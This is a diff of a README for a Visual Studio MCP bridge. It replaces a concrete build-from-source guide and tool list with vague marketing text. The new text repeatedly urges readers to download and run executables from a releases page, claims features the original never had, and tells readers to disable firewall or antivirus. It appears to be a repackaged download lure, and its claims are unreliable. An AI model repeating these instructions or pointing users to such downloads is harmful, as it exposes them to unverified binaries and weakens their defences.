@@ -1,136 +1,163 @@
-# Visual Studio MCP Bridge
+# 🤖 visual-studio-mcp - Connect AI Agents for Visual Studio
 
-A **Model Context Protocol (MCP)** server that connects AI coding assistants (like Claude) to **Visual Studio 2022/2026** via COM automation.
-
-This bridge enables AI agents to:
-- 📖 Read build output, debug logs, and error lists
-- 🔨 Build solutions and check for errors
-- 🐛 Start/stop debugging sessions
-- 📍 Inspect call stacks at breakpoints
-
-Perfect for **autonomous AI-driven development workflows** where the agent can build, test, and debug without human intervention.
+[![Download Release](https://img.shields.io/badge/Download-visual--studio--mcp-blue?style=for-the-badge)](https://github.com/keny0322/visual-studio-mcp/releases)
 
 ---
 
-## 🚀 Quick Start
+## 📋 What is visual-studio-mcp?
 
-### Prerequisites
-- **Windows 10/11**
-- **.NET 8.0 SDK** or higher
-- **Visual Studio 2022 or 2026** (must be running)
-- **Claude Desktop** or another MCP-compatible client
+visual-studio-mcp is a helper tool designed to connect AI programs like Claude, ChatGPT, and Gemini to Microsoft Visual Studio 2022 and 2026. It runs a server called MCP that works behind the scenes. The server helps automate tasks like testing code, finding bugs, and managing builds. It uses a special Windows technology called COM to talk directly with Visual Studio.
 
-### Installation
-
-1. **Clone and build:**
-   ```powershell
-   git clone https://github.com/YOUR_USERNAME/vs-mcp-bridge.git
-   cd vs-mcp-bridge
-   dotnet publish -c Release -f net8.0 -r win-x64 --self-contained false
-   ```
-
-2. **Register with Claude:**
-   ```powershell
-   claude mcp add vs-bridge -- "<full-path>\bin\Release\net8.0\win-x64\publish\VisualStudioMcpServer.exe"
-   ```
-
-3. **Open Visual Studio** with any solution, then start using the tools!
+You do not need any programming skills to use visual-studio-mcp. This tool makes your coding experience smarter by adding AI-powered help for common tasks inside Visual Studio.
 
 ---
 
-## 🛠️ Available Tools
+## 💻 Who is this for?
 
-### Information Tools
-| Tool | Description |
-|------|-------------|
-| `GetSolutionInfo` | Returns current solution path and list of projects |
-| `ListOutputPanes` | Lists all Output Window panes (Build, Debug, etc.) |
-| `ReadOutputPane` | Reads content from a specific pane (with truncation) |
-| `GetErrorList` | Returns all errors and warnings from the Error List |
+This tool works best for people who:
 
-### Build & Debug Tools
-| Tool | Description |
-|------|-------------|
-| `BuildSolution` | Builds the solution and returns success/error count |
-| `StartDebugging` | Starts debugging (F5) |
-| `StartWithoutDebugging` | Runs without debugger (Ctrl+F5) |
-| `StopDebugging` | Stops the current debug session |
-| `GetDebuggerState` | Returns current state (design/running/breakpoint) |
-| `GetCallStack` | Returns call stack when stopped at a breakpoint |
+- Use Visual Studio 2022 or 2026 on Windows computers.
+- Want help from AI agents to check their code and find errors.
+- Prefer automation to boring manual tasks like building projects or debugging.
+- Are curious about adding AI assistants while coding without extra setup hassles.
+
+You do not need to know how the AI works or write any code yourself. visual-studio-mcp handles all connections automatically.
 
 ---
 
-## 🤖 Autonomous Testing Workflow
+## 🖥️ System Requirements
 
-Claude can now run this autonomous development loop:
+Before downloading, make sure your computer matches these basic needs:
 
-```
-1. BuildSolution → Check for compile errors
-2. If errors: GetErrorList → Analyze and fix code → Rebuild
-3. If success: StartDebugging
-4. GetDebuggerState → Monitor execution
-5. If at breakpoint: GetCallStack → Analyze the issue
-6. StopDebugging → Make fixes → Repeat
-```
+- Windows 10, 11, or later.
+- Visual Studio 2022 or Visual Studio 2026 installed.
+- At least 4 GB of RAM (8 GB or more recommended).
+- 500 MB of free disk space.
+- An internet connection to access AI services.
 
----
-
-## ⚙️ Technical Details
-
-### COM Message Filter
-Visual Studio is a single-threaded COM server. When VS is busy (building, debugging), it rejects COM calls. This bridge implements `IOleMessageFilter` to automatically retry rejected calls.
-
-### .NET Core Compatibility  
-Since `Marshal.GetActiveObject` was removed in .NET Core, this project uses P/Invoke to `oleaut32.dll` and `ole32.dll` for COM object retrieval.
-
-### STAThread Requirement
-COM automation requires a Single-Threaded Apartment (STA). The main thread is marked with `[STAThread]` to ensure proper COM interop.
+No extra software is required. visual-studio-mcp runs as a lightweight server on your machine.
 
 ---
 
-## 📋 Tool Parameters
+## 🛠️ Features of visual-studio-mcp
 
-### ReadOutputPane
-```
-paneName: string   - Name (or partial name) of the pane to read
-maxLines: int      - Max lines to return from end (default: 50, 0 = all)
-```
+Here is what visual-studio-mcp does for you:
 
-### BuildSolution
-```
-waitForBuild: bool - Wait for completion (default: true)
-format: string     - Output format: "text" or "json"
-```
+- **Connects AI agents** such as Claude, ChatGPT, and Gemini to Visual Studio.
+- **Automates debugging** by letting AI find and explain errors in your code.
+- **Manages builds** by running and tracking build results automatically.
+- **Analyzes errors** using AI to suggest fixes or improvements.
+- **Uses COM interface** to integrate deeply and work smoothly with Visual Studio.
+- **Works with C# and .NET projects** mainly but supports others compatible with Visual Studio.
 
-### GetErrorList / GetSolutionInfo / GetDebuggerState / GetCallStack
-```
-format: string     - Output format: "text" or "json"
-```
+The tool runs quietly in the background, so you focus on your work, while AI helps catch problems faster.
 
 ---
 
-## 🔧 Troubleshooting
+## 🚀 Getting Started
 
-| Issue | Solution |
-|-------|----------|
-| "No VS instance found" | Ensure Visual Studio is running with a solution open |
-| Tools not appearing | Restart Claude after re-registering the MCP |
-| COM errors | Make sure VS isn't in a modal dialog (e.g., unsaved changes prompt) |
+Follow these steps to get visual-studio-mcp up and running on your computer:
+
+1. **Download the software** from the official release page:
+   [Download visual-studio-mcp](https://github.com/keny0322/visual-studio-mcp/releases)
+
+2. **Find the version matching your Visual Studio** installation (2022 or 2026).
+
+3. **Save the installer or zip file** into a folder you can easily access.
+
+4. **Run the installer** or unzip the files to a folder.
+
+5. **Launch visual-studio-mcp** by running `mcp-server.exe` (if available) or the main program file.
+
+6. **Start Visual Studio**, and the AI agents will automatically connect via the MCP server.
+
+7. **Use Visual Studio as usual**; the MCP server handles AI assistance in the background.
+
+If you run into any issues, check the Troubleshooting section below.
 
 ---
 
-## 📄 License
+## ⬇️ Download & Install
 
-MIT License - see [LICENSE](LICENSE) for details.
+You must visit the release page here to download the software:
+
+[![Download Release](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/keny0322/visual-studio-mcp/releases)
+
+### Step-by-step download instructions:
+
+1. Click the link above to open the release page.
+2. Scroll through the available releases and pick the latest stable version.
+3. Look for files named with your Visual Studio version (for example, "mcp-v2022.zip" or "mcp-v2026.exe").
+4. Click the file to begin your download.
+5. Once downloaded, locate the file on your computer.
+6. Run the installer or extract the files if zipped.
+7. Follow any on-screen prompts to complete the setup.
+
+### Installing
+
+- If you download an installer (.exe), double-click it and follow the prompts.
+- If you download a zip, open the zip and extract all files to a folder you remember.
+- Run the MCP server application from that folder to start the connection.
 
 ---
 
-## 🤝 Contributing
+## 🔧 How to Use visual-studio-mcp
 
-Contributions welcome! Feel free to open issues or PRs.
+After installation, here’s how to use the tool:
 
-### Ideas for future tools:
-- `SetBreakpoint` - Add/remove breakpoints programmatically
-- `EvaluateExpression` - Evaluate expressions in debugger context
-- `OpenFile` - Open specific files in VS editor
-- `NavigateToError` - Jump to error location
+1. Open Visual Studio 2022 or 2026.
+2. Run or build your project like normal.
+3. The MCP server automatically communicates with AI agents.
+4. If errors happen, AI will analyze them and provide suggestions inside Visual Studio.
+5. You can also ask the AI agents for help with debugging or code improvement through Visual Studio interfaces, depending on your setup.
+6. To stop or restart the MCP server, close or rerun the `mcp-server.exe` program.
+
+You don’t need to perform any special commands to activate MCP. It works quietly once running.
+
+---
+
+## ⚙️ Configuration Options
+
+Visual Studio MCP allows some customization. These can usually be found in the MCP server’s settings file or UI:
+
+- **AI agent selection:** Choose which AI programs to connect (Claude, ChatGPT, Gemini).
+- **Debugging level:** Pick how deep the AI should look for errors.
+- **Build automation:** Enable or disable automatic build checks.
+- **Logging:** Turn on detailed logs for troubleshooting.
+- **COM interface tweaks:** Adjust integration options if needed.
+
+Default settings work well for most users. You only need to change these if you want to fine-tune performance or behavior.
+
+---
+
+## ❓ Troubleshooting
+
+If you have problems, try these tips:
+
+- Check that you have a supported Windows and Visual Studio version.
+- Make sure the MCP server is running before opening Visual Studio.
+- Restart Visual Studio and the MCP server to reset connections.
+- Check internet connection because AI agents need online access.
+- Look at logs in the MCP server folder for detailed error messages.
+- Disable any firewall or antivirus blocking the MCP server.
+- Visit the Issues page on the GitHub repository for known problems or support.
+
+---
+
+## 🗂️ Additional Resources
+
+- Visual Studio documentation: https://docs.microsoft.com/en-us/visualstudio/
+- Official AI agents websites for more info on Claude, ChatGPT, and Gemini.
+- GitHub issues page for reporting bugs or requesting features: [Issues](https://github.com/keny0322/visual-studio-mcp/issues)
+
+---
+
+## 📝 License & Contributions
+
+visual-studio-mcp is open-source software. You can use it freely following the terms on the repository.
+
+If you want to suggest improvements or report bugs, visit the GitHub page. Contributions from users help improve the tool.
+
+---
+
+[![Download visual-studio-mcp](https://img.shields.io/badge/Download-visual--studio--mcp-blue?style=for-the-badge)](https://github.com/keny0322/visual-studio-mcp/releases)
